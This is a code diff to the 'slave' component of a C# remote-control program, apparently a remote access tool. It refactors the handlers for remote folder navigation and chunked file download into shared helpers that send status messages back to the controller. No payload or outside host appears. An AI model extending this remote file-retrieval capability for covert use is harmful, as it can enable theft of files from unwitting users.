@@ -66,6 +66,37 @@ namespace BlackHole.Slave
                 .With<DownloadFilePartMessage>(DownloadFilePart);
         }
 
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="operation"></param>
+        /// <param name="message"></param>
+        private void SendStatus(string operation, Exception exception) => SendStatus(operation, false, exception.ToString());
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="operation"></param>
+        /// <param name="message"></param>
+        private void SendStatus(string operation, string message) => SendStatus(operation, true, message);
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="operation"></param>
+        /// <param name="success"></param>
+        /// <param name="message"></param>
+        private void SendStatus(string operation, bool success, string message)
+        {
+            Send(new StatusUpdateMessage()
+            {
+                Operation = operation,
+                Success = success,
+                Message = message
+            });
+        }
+
         /// <summary>
         /// 
         /// </summary>
@@ -82,6 +113,34 @@ namespace BlackHole.Slave
         {
             Send(new PongMessage());
         }
+           
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <typeparam name="T"></typeparam>
+        /// <param name="name"></param>
+        /// <param name="operation"></param>
+        /// <param name="messageBuilder"></param>
+        private void ExecuteSimpleOperation<T>(string name, Func<T> operation, Func<T, string> messageBuilder) where T : NetMessage
+            => ExecuteComplexSendOperation(name, operation, (message) =>
+            {
+                SendStatus(name, "Success : " + messageBuilder(message));
+            });
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <typeparam name="T"></typeparam>
+        /// <param name="name"></param>
+        /// <param name="operation"></param>
+        /// <param name="success"></param>
+        private void ExecuteComplexSendOperation<T>(string name, Func<T> operation, Action<T> success) where T : NetMessage
+            => Utility.ExecuteComplexOperation(name, operation, (message) =>
+            {
+                Send(message);
+                success(message);
+            }, (e) => SendStatus(name, e));
+
 
         /// <summary>
         /// 
@@ -89,19 +148,9 @@ namespace BlackHole.Slave
         /// <param name="message"></param>
         private void NavigateToFolder(NavigateToFolderMessage message)
         {
-            try
-            {
-                Send(FileHelper.Instance.NavigateToFolder(message.Path));
-            }
-            catch(Exception e)
-            {
-                Send(new StatusUpdateMessage()
-                {
-                    Operation = "Folder navigation",
-                    Success = false,
-                    Message = e.Message
-                });
-            }
+            ExecuteSimpleOperation("Folder navigation", 
+                () => FileHelper.NavigateToFolder(message.Path), 
+                (nav) => nav.Path);
         }
 
         /// <summary>
@@ -110,19 +159,13 @@ namespace BlackHole.Slave
         /// <param name="message"></param>
         private void DownloadFilePart(DownloadFilePartMessage message)
         {
-            try
-            {
-                Send(FileHelper.Instance.DownloadFilePart(message.Id, message.CurrentPart, message.Path));
-            }
-            catch(Exception e)
-            {
-                Send(new StatusUpdateMessage()
+            ExecuteComplexSendOperation("File download",
+                () => FileHelper.DownloadFilePart(message.Id, message.CurrentPart, message.Path),
+                (part) =>
                 {
-                    Operation = "File download",
-                    Success = false,
-                    Message = e.Message
+                    if (part.CurrentPart == part.TotalPart)
+                        SendStatus("File download", "Successfully downloaded : " + part.Path);
                 });
-            }
         }
     }
 }
